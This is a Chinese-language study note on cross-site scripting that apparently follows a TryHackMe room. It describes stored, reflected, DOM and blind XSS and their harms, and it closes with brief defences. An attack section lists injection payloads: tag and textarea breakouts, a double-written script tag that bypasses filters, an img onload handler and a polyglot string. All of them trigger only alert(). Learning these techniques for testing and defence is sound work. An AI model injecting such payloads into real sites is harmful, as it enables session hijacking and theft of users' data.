# XSS

## 介绍

XSS 是一种通常在 WEB 应用程序中发现的安全漏洞，可以让攻击者在受害者的机器上执行恶意脚本

## 危害

* COOKIE 窃取
* 键盘记录
* 网络摄像头快照
* 网络钓鱼
* 端口扫描： 使用存储型 XSS 扫描内部网络并识别网络上其他主机
* 其他攻击

分类

### 1. 存储型 XSS

`最危险的类型，XSS 被存储到应用程序的服务器上`

![img](https://img-blog.csdnimg.cn/img\_convert/70fd2c854199d9484bbc86c6f41ef904.png)

### 2. 反向 XSS

`恶意负载是受害者对网站请求的一部分，攻击者诱导用户点击 URL 来执行他们的恶意负载`

一个网站，如果您输入的内容不正确，则会显示一条错误消息。错误消息的内容取自查询字符串中的**错误**参数，并直接构建到页面源代码中

![img](https://img-blog.csdnimg.cn/img\_convert/3073dd7cfc9efae15397619cf82f1d22.png)

应用程序不检查**错误**参数的内容，这允许攻击者插入恶意代码

![img](https://img-blog.csdnimg.cn/img\_convert/1c10a0f6a455f84ed02e7358b20d21c0.png)

该漏洞可以按照下图中的场景使用 ![img](https://tryhackme-images.s3.amazonaws.com/user-uploads/5efe36fb68daf465530ca761/room-content/8e3bffe500771c03366de569c3565058.png)

> 攻击者可以向潜在受害者发送连接或将它们嵌入到另一个网站上包含 JavaScript 负载的 iframe 中，让他们在浏览器上执行代码，从而可能泄露会话或客户信息。

### 3. DOM XSS

`我们可以利用此漏洞来修改文档结构、样式、内容，只有加载了易受攻击的 JS 代码并交互时，才会执行 JS 有效负载`

> 攻击者可以将链接发送给受害者，将他们重定向到另一个网站或者窃取用户会话内容

### 4. Bind XSS

`Bind XSS 类似于 存储型 XSS， 因为您的有效载荷存储在网站上供其他用户查看，但在这种情况下，您看不到有效载荷工作或无法测试它首先反对自己`

**示例场景：**

一个网站有一个联系表单，攻击者可以在其中向员工发送消息。服务器不会检查邮件内容是否有任何恶意代码，这使攻击者可以输入他们想要的任何内容。然后，这些消息会变成支持工单，员工可以在私人门户网站上查看这些工单。

**潜在影响：**

使用正确的有效载荷，攻击者的 JavaScript 可以回调攻击者的网站，显示员工门户 URL、员工的 cookie，甚至是正在查看的门户页面的内容。现在，攻击者可能会劫持员工的会话并访问私有门户。

**如何测试盲 XSS**

在测试 Blind XSS 漏洞时，您需要确保您的 payload 有回调（通常是HTTP请求）。这样，您就知道您的代码是否以及何时被执行。

> * [xsshunter](https://xsshunter.com/) Bind XSS 攻击工具，自动获取 COOKIE 、URL、页面内容

## 攻击

### 1. 直接显示

```javascript
<script>alert('THM');</script>
```

> 不进行过滤直接作为显示

### 2. 显示在标签中

![img](https://img-blog.csdnimg.cn/img\_convert/2e75c64fd51a310c0eecbf4c78c67175.png)

```javascript
"><script>alert('THM');</script>

<input value=""> <script>alert('THM');</script>
```

### 3. 显示在 textarea 标签中

![img](https://img-blog.csdnimg.cn/img\_convert/d6bada12132720e965d86a05a040e03c.png)

```javascript
</textarea><script>alert('THM');</script>

<textarea></textarea><script>alert('THM');</script>
```

### 4. 过滤 script

> * 双写
> * 大小写

```javascript
<sscriptcript>alert('THM');</sscriptcript>
```

### 5. 替代

```javascript
<img src ="/images/cat.jpg" onload="alert('THM');>

jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onerror=alert('THM') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert('THM')//>\x3e
```

## 防御

* 转义所用用户输入
* 验证输入
* 清理数据
